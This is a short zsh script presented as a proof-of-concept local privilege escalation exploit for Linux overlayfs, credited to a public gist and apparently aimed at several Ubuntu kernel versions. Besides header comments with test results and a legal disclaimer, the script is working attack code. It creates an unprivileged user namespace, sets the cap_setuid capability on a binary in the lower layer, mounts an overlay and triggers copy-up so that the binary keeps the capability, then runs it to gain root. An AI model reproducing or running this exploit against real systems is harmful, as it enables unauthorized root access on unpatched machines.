#!/usr/bin/zsh
################################################################################
# $Id: win3zz.exploit v0.2 2024-02-02 23:32:59 +0100 .m0rph $
################################################################################
# Privilege escalation via overlayfs...
#
# Credits:
#    Original found on https://gist.github.com/win3zz
# 
# -----------------------------------------------------------------------------
# Tested under:
#  Debian 12.2.0, kernel 6.1.0-16-amd :: NO WAY !!!
#  Debian 12.4.0, kernel 6.1.0-17-amd :: NO WAY !!!
#  Kali  2024.01, kernel 6.6.9-1kali1 :: NO WAY !!!
# -----------------------------------------------------------------------------
# Should be woking under Ubuntu:
#  kernel 6.2.0  ::  23.04 (Lunar Lobster), 22.04 LTS (Jammy Jellyfish)
#  kernel 5.19.0 ::  22.10 (Kinetic Kudu),  22.04 LTS (Jammy Jellyfish)
#  kernel 5.4.0  ::  22.04 (Local Fossa),   18.04 LTS (Bionic Beaver)
# -----------------------------------------------------------------------------
# Disclaimer:
#  This Proof of Concept (PoC) is intended for research and educational purposes
#  only. Any actions taken based on the information provided in this gist are
#  solely at the user's own risk. The vulnerabilities described in this report
#  should not be exploited in any unauthorized or malicious manner. The authors
#  and contributors are not responsible for any misuse or damage that may
#  result from the use of this information.
#
# Please keep in mind that using malicious software and causing damage at
# foreign systems without being ordered or charged is ILLEGAL and will result in
# law enforcement! The worst case is that you end up in PRISON!
################################################################################

# when it didn't work, nothing has been deleted in the end :-\
rm -rf l u w m 2>/dev/null

unshare -rm /bin/zsh -c "
mkdir l u w m &&
cp -p privtest l/ &&
/usr/sbin/setcap cap_setuid+eip l/privtest &&
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/privtest &&
m/privtest;"

exit 0

# EOF
